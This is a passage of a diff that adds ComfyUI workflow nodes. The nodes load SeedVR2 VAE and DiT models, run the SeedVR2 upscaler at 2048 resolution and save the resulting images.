+      "color_correction": "wavelet",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cuda:0",
+      "enable_debug": false,
+      "image": [
+        "1199",
+        0
+      ],
+      "dit": [
+        "1281",
+        0
+      ],
+      "vae": [
+        "1280",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2 Video Upscaler (v2.5.24)"
+    }
+  },
+  "1284": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cuda:0",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load VAE Model"
+    }
+  },
+  "1285": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp16.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load DiT Model"
+    }
+  },
+  "1286": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "1287",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "1287": {
+    "inputs": {
+      "seed": 2961070799,
+      "resolution": 2048,
+      "max_resolution": 4500,
+      "batch_size": 1,
+      "uniform_batch_size": false,
+      "color_correction": "wavelet",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cuda:0",
+      "enable_debug": false,
+      "image": [
+        "1219",
+        0
+      ],
+      "dit": [
+        "1285",
+        0
+      ],
+      "vae": [
+        "1284",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2 Video Upscaler (v2.5.24)"
+    }
+  },
+  "1288": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cuda:0",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load VAE Model"
+    }
+  },
+  "1289": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp16.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load DiT Model"
+    }
+  },
+  "1290": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "1291",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "1291": {
+    "inputs": {
+      "seed": 2961070799,
+      "resolution": 2048,
+      "max_resolution": 4500,
+      "batch_size": 1,
+      "uniform_batch_size": false,
+      "color_correction": "wavelet",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cuda:0",
+      "enable_debug": false,
+      "image": [
+        "1159",
+        0
+      ],
+      "dit": [
+        "1289",
+        0
+      ],
+      "vae": [
+        "1288",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2 Video Upscaler (v2.5.24)"
+    }
+  },
+  "1292": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cuda:0",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load VAE Model"
+    }
+  },
+  "1293": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp16.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load DiT Model"
+    }
+  },
+  "1295": {
+    "inputs": {
+      "seed": 2961070799,
+      "resolution": 2048,
+      "max_resolution": 4500,
+      "batch_size": 1,
+      "uniform_batch_size": false,
+      "color_correction": "wavelet",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cuda:0",
+      "enable_debug": false,
+      "image": [
+        "1139",
+        0
+      ],
+      "dit": [
+        "1293",
+        0
+      ],
+      "vae": [
+        "1292",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2 Video Upscaler (v2.5.24)"
+    }
+  },
+  "1296": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cuda:0",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load VAE Model"
+    }
+  },
+  "1297": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp16.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load DiT Model"
+    }
+  },
+  "1298": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "1299",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "1299": {
+    "inputs": {
+      "seed": 2961070799,
+      "resolution": 2048,
+      "max_resolution": 4500,
+      "batch_size": 1,
+      "uniform_batch_size": false,
+      "color_correction": "wavelet",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cuda:0",
+      "enable_debug": false,
+      "image": [
+        "1119",
+        0
+      ],
+      "dit": [
+        "1297",
+        0
+      ],
+      "vae": [
+        "1296",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2 Video Upscaler (v2.5.24)"
     }
   }
 }
